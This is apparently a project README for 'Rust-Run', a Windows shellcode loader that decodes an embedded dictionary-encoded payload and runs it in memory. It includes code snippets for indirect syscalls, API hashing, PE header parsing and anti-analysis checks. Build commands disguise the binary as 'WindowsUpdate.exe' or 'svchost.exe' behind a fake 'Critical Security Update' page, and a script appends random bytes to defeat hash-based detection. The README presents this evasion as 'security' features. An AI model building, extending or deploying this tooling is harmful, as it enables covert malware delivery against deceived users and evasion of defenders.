# Rust-Run

A secure and optimized utility for executing encoded shellcode through a dictionary-based decoding mechanism.

## Integration with Tex1step Delivery Framework

Rust-Run has been specifically designed to integrate with the Tex1step delivery framework. This integration provides a powerful combination of Rust-Run's secure shellcode execution capabilities with Tex1step's sophisticated delivery mechanisms.

### Embedded Payload Design

The current implementation embeds both the Spanish dictionary and encoded payload directly within the executable:

- The encoded payload and dictionary are stored as string constants in the source code (`EMBEDDED_DICTIONARY` and `EMBEDDED_ENCODED_PAYLOAD`)
- This eliminates network dependencies, making the payload more reliable and reducing detection vectors
- The execution flow remains unchanged, maintaining all security and anti-analysis features
- The modified `download_with_retries` function intercepts specific URL requests and redirects to embedded content:
  ```rust
  fn download_with_retries(client: &reqwest::blocking::Client, url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
      // Check if this is a request for dictionary or payload and return embedded content
      if url.ends_with("es-dictionary.txt") {
          return get_embedded_content("dictionary");
      } else if url.ends_with("load.txt") {
          return get_embedded_content("payload");
      }
      
      // Fallback to actual download for any other URLs (keeping original functionality)
      // ...
  }
  ```

### Build Process for Tex1step Integration

```bash
# 1. Build the Rust-Run executable with embedded payload
cd ./rust-run
cargo build --release --target x86_64-pc-windows-gnu

# 2. Copy the compiled executable to Tex1step's payload directory
cp target/x86_64-pc-windows-gnu/release/rust-run.exe ../tex1step/payloads/WindowsUpdate.exe

# 3. Deploy using Tex1step's build system
cd ../tex1step
node src/build.js --exe-name "svchost.exe" --page-title "Critical Security Update" --package-tool custom-rust-run --obfuscate --break-signature-detection
```

### Custom Integration Option

To maximize delivery effectiveness, you can fully integrate Rust-Run as a custom payload directly in the Tex1step build process:

1. **Create a custom payload handler** in Tex1step:
   ```javascript
   // File: tex1step/src/delivery/custom_payload.js
   function prepareRustRunPayload(options) {
     const {
       sourcePath = path.join(__dirname, '../../payloads/rust-run.exe'),
       outputPath,
       addRandomization = true,
       randomDataSize = 512
     } = options;
     
     // Read executable and add randomization to break hash-based detection
     const exeData = fs.readFileSync(sourcePath);
     const randomBuffer = crypto.randomBytes(randomDataSize);
     const combinedBuffer = Buffer.concat([exeData, randomBuffer]);
     fs.writeFileSync(outputPath, combinedBuffer);
   }
   ```

2. **Modify Tex1step's build_exe.js** to use your custom payload:
   ```javascript
   // Add 'custom-rust-run' as a package tool option
   const PACKAGE_TOOLS = ['pkg', 'nexe', 'custom-rust-run'];
   
   // In the buildExecutable function:
   if (config.packageTool === 'custom-rust-run') {
     customPayload.prepareRustRunPayload({
       outputPath: path.join(config.outputDir, config.exeName),
       addRandomization: config.breakSignatureDetection
     });
   }
   ```

### Security Benefits

This integrated approach offers several security advantages:

- No network traffic for payload retrieval, reducing detection vectors
- All anti-analysis techniques remain functional
- Execution still uses advanced techniques like indirect syscalls
- Maintains the appearance of legitimate network operations
- Compatible with Tex1step's browser-based delivery and anti-detection mechanisms

## Key Features

### Memory Handling Optimizations

- **Two-phase memory allocation**: First allocates with RW permissions for safer copying, then switches to execute-only permissions
- **Memory alignment**: Ensures 16-byte alignment for optimal cache performance
- **Memory protection**: Uses the principle of least privilege with PAGE_EXECUTE rather than PAGE_EXECUTE_READWRITE
- **Memory barriers**: Implements memory barriers to prevent instruction reordering during execution

### Performance Optimizations

- **HashMap-based dictionary lookup**: O(1) lookups instead of O(n) linear searches for significant speed improvement
- **Local file caching**: Automatically caches dictionary and payload locally to reduce network dependency
- **Proper memory cleanup**: Ensures allocated memory is properly released even when execution fails
- **Fallback execution method**: Provides alternative execution path if primary method fails

### Security Enhancements

- **HTTPS-only URL validation**: Enforces secure connections for dictionary and payload retrieval
- **Detailed error reporting**: Captures and reports Windows error codes for better diagnostics
- **Debug mode**: Optional debug mode for detailed shellcode inspection with logging
- **Missing token tracking**: Counts and reports missing dictionary tokens
- **Anti-analysis detection**: Checks for virtualization or analysis environments using timing anomalies
- **Indirect syscalls**: Uses function name hashing and syscall number resolution to avoid direct API imports
- **PE header resolution**: Dynamically resolves NT headers for finding syscall patterns in memory

### Syscall-Based Evasion

The implementation uses several techniques to avoid detection:

1. **Function resolution by hash**: Instead of using function names directly (which can be easily monitored):
   ```rust
   unsafe fn get_syscall_info(function_hash: u32) -> Option<SyscallInfo>
   ```

2. **Manual PE header parsing**: Examines ntdll.dll in memory to find syscall patterns:
   ```rust
   let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize) as *const win::IMAGE_NT_HEADERS64;
   let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[win::IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
   ```

3. **Dynamic syscall number extraction**: Extracts syscall numbers from memory rather than hardcoding:
   ```rust
   if ptr::read_unaligned(byte_ptr) == 0xB8 {  // MOV EAX, imm32
       let ssn = ptr::read_unaligned(byte_ptr.add(1) as *const u32);
   ```

4. **Direct syscall execution**: Uses inline assembly to execute syscalls directly:
   ```rust
   asm!(
       "mov r10, rcx",
       "mov eax, {ssn:e}",
       "syscall",
       ssn = in(reg) syscall_info.ssn,
       // ...
   );
   ```

## Build System

### Release Profile Optimizations

The project's release profile is configured with the following optimizations in `Cargo.toml`:

```toml
[profile.release]
opt-level = 3       # Maximum optimization level
lto = true          # Link-time optimization for smaller binaries
codegen-units = 1   # Slower compilation but better optimization
panic = "abort"     # Smaller binary size by removing panic unwinding
strip = true        # Removes debug symbols
```

### Build Instructions

#### Windows
```
build.bat
```

#### Unix-based Systems
```
./build.sh
```

Both build scripts:
- Check for Rust installation and display version information
- Offer interactive selection between debug and release builds
- Apply platform-specific optimizations (target-cpu=native on Unix systems)
- Provide options to run the program after building
- Support enabling debug logging

### Release Build Specifics

The release build applies additional optimizations:
- On Unix systems: Uses RUSTFLAGS="-C target-cpu=native -C opt-level=3" for CPU-specific optimizations
- Generates a significantly smaller binary compared to debug builds
- Strips debugging information while maintaining error reporting capabilities

## Usage

The application will automatically:

1. Download (or load cached) dictionary and encoded payload
2. Decode the payload using the optimized HashMap-based dictionary lookup
3. Allocate properly aligned and protected memory
4. Copy and execute the decoded shellcode with appropriate memory protection

### Environment Variables

- `RUST_LOG=debug` - Enable detailed logging for execution information and shellcode debugging

## Technical Implementation

### Memory Protection Workflow

1. Allocate memory with `PAGE_READWRITE` permissions:
   - Primary: Uses `NtAllocateVirtualMemory` syscall identified by hash to avoid direct imports
   - Fallback: Uses standard `VirtualAlloc` Windows API if syscall method fails
2. Copy shellcode bytes to allocated memory with proper alignment (16-byte)
3. Change protection to `PAGE_EXECUTE` (execute-only):
   - Primary: Uses `NtProtectVirtualMemory` syscall for stealth
   - Fallback: Uses standard `VirtualProtect` Windows API
4. Insert memory barriers before and after execution to prevent instruction reordering
5. Execute shellcode with proper function signature using function pointer casting
6. Release memory with cleanup routines regardless of execution outcome

### Dictionary Decoding Process

1. Create a HashMap from the dictionary for O(1) lookups
2. Process each token from the encoded payload
3. Look up token in dictionary or try parsing as direct byte value
4. Track and report any missing tokens
5. Return the decoded shellcode bytes

### Fallback Execution

If the primary execution method fails, the system falls back to a more permissive approach using `PAGE_EXECUTE_READWRITE` memory protection for maximum compatibility.

## Requirements

- Rust 1.67.0 or higher
- Windows operating system (primary target)
- Linux/macOS (supported for development and building)
